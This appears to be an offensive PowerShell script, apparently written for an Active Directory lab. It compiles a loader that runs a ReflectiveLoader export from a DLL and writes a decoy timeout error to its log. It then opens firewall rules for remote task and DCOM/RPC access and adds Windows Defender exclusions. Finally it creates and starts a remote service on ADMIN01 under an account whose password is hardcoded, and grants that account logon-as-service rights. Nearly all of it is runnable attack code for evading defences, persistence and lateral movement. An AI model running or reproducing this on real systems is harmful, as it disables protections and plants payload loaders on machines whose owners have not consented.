# ------------------------------------------------------------------------
# Setup-NewService.ps1
# ------------------------------------------------------------------------
# 1. Build a minimal .NET console application called NewService.exe
#    It attempts to load and run NewService.dll via its exported ReflectiveLoader function,
#    and writes a log message depending on its execution result.
$source = @'
using System;
using System.IO;
using System.Runtime.InteropServices;

public static class Program
{
    // P/Invoke declarations to load a native DLL.
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr LoadLibrary(string lpFileName);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    // Define a delegate for the ReflectiveLoader function.
    // We assume the exported function has the signature: int ReflectiveLoader(void)
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate int ReflectiveLoaderDelegate();

    public static void Main()
    {
        string exeDir = AppDomain.CurrentDomain.BaseDirectory;
        string logPath = Path.Combine(exeDir, "service.log");
        string dllPath = Path.Combine(exeDir, "NewService.dll");

        if (!File.Exists(dllPath))
        {
            File.WriteAllText(logPath, "NewService.dll is missing.");
        }
        else
        {
            try
            {
                IntPtr hModule = LoadLibrary(dllPath);
                if (hModule == IntPtr.Zero)
                {
                    int err = Marshal.GetLastWin32Error();
                    File.WriteAllText(logPath, "Failed to load NewService.dll. Error: " + err);
                }
                else
                {
                    IntPtr procAddress = GetProcAddress(hModule, "ReflectiveLoader");
                    if (procAddress == IntPtr.Zero)
                    {
                        int err = Marshal.GetLastWin32Error();
                        File.WriteAllText(logPath, "ReflectiveLoader not found in NewService.dll. Error: " + err);
                    }
                    else
                    {
                        ReflectiveLoaderDelegate loader = (ReflectiveLoaderDelegate)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(ReflectiveLoaderDelegate));
                        int result = loader();
                        File.WriteAllText(logPath, "The service did not respond to the start or control request in a timely fashion.");
                    }
                }
            }
            catch (Exception ex)
            {
                File.WriteAllText(logPath, "Error executing NewService.dll: " + ex.Message);
            }
        }
        Environment.Exit(1);
    }
}
'@

Write-Host "`nBuilding NewService.exe from embedded C# code..."
Add-Type -TypeDefinition $source -OutputAssembly "NewService.exe" -OutputType ConsoleApplication
Write-Host "NewService.exe created successfully in the current directory."

# 2. Enable Remote Scheduled Tasks Management in the firewall
Write-Host "`nEnabling Remote Scheduled Tasks Management..."
netsh advfirewall firewall set rule group="Remote Scheduled Tasks Management" new enable=Yes

# 3. Allow DCOM and RPC inbound (TCP ports 135, 49152-65535)
Write-Host "`nAllowing DCOM and RPC inbound..."
New-NetFirewallRule -DisplayName "Allow DCOM and RPC" `
                    -Direction Inbound `
                    -Action Allow `
                    -Protocol TCP `
                    -LocalPort 135,49152-65535 | Out-Null

# 4. Add a Windows Defender directory exclusion for 'C:\Users\Helen'
Write-Host "`nAdding Defender exclusion for 'C:\Users\Helen'..."
Add-MpPreference -ExclusionPath 'C:\Users\Helen'

# 5. Create the C:\NewService folder (if missing) and copy in NewService.exe
Write-Host "`nCreating 'C:\NewService' folder and copying NewService.exe..."
New-Item -Path "C:\NewService" -ItemType Directory -Force | Out-Null
Copy-Item -Path ".\NewService.exe" -Destination "C:\NewService" -Force

# 6. Add a Windows Defender exclusion for 'C:\NewService'
Write-Host "`nAdding Defender exclusion for 'C:\NewService'..."
Add-MpPreference -ExclusionPath 'C:\NewService'

# 7. Create the NewService service on ADMIN01, running as AD.LAB\Jamie
Write-Host "`nCreating the 'NewService' service on ADMIN01..."
sc.exe \\ADMIN01 create NewService binPath= "C:\NewService\NewService.exe" obj= "AD.LAB\Jamie" password= "digital99.3"

Write-Host "`nChecking NewService configuration..."
sc.exe \\ADMIN01 qc NewService

# 8. Grant 'Log on as a service' right to AD.LAB\Jamie via secedit (using Start-Process -Wait).
function Grant-LogonAsServiceRight($account) {
    $tempDir  = "C:\Temp"
    $cfgFile  = Join-Path $tempDir "LogonAsService.inf"
    $sdbFile  = Join-Path $tempDir "LogonAsService.sdb"

    if (-not (Test-Path $tempDir)) {
        New-Item -Path $tempDir -ItemType Directory | Out-Null
    }

    Write-Host "`nExporting local security policy..."
    Start-Process -FilePath "secedit.exe" -ArgumentList "/export", "/cfg", "$cfgFile" -Wait -NoNewWindow

    Write-Host "`nModifying exported policy to add '$account' to SeServiceLogonRight..."
    $policy = Get-Content $cfgFile
    $rightPattern = '^SeServiceLogonRight\s*=\s*(.*)'
    $found = $false
    for ($i = 0; $i -lt $policy.Count; $i++) {
        if ($policy[$i] -match $rightPattern) {
            $found = $true
            $users = $Matches[1].Split(',', [System.StringSplitOptions]::RemoveEmptyEntries)
            if ($users -notcontains $account) {
                $users += $account
                $policy[$i] = "SeServiceLogonRight = " + ($users -join ",")
            }
        }
    }
    if (-not $found) {
        $policy += "SeServiceLogonRight = $account"
    }
    Set-Content $cfgFile $policy

    Write-Host "`nImporting updated policy..."
    # Pipe "Y" to auto-confirm the /overwrite prompt
    $importCommand = "echo Y | secedit.exe /import /db `"$sdbFile`" /cfg `"$cfgFile`" /overwrite"
    cmd.exe /c $importCommand | Out-Null

    Write-Host "`nApplying updated policy (USER_RIGHTS)..."
    Start-Process -FilePath "secedit.exe" -ArgumentList "/configure", "/db", "$sdbFile", "/cfg", "$cfgFile", "/areas", "USER_RIGHTS" -Wait -NoNewWindow

    Write-Host "`nGranted 'Log on as a service' right to $account."
}

Write-Host "`nGranting 'Log on as a service' right to AD.LAB\Jamie..."
Grant-LogonAsServiceRight "AD.LAB\Jamie"

# 9. Start the new service and show any service.log
Write-Host "`nStarting 'NewService' on ADMIN01..."
sc.exe \\ADMIN01 start NewService

Write-Host "`nWaiting briefly for service.log to appear in C:\NewService..."
Start-Sleep -Seconds 2

Write-Host "`nService Log Content (if any):"
if (Test-Path "C:\NewService\service.log") {
    Get-Content "C:\NewService\service.log"
} else {
    Write-Host "No service.log found."
}

Write-Host "`nDone. The script has completed successfully."
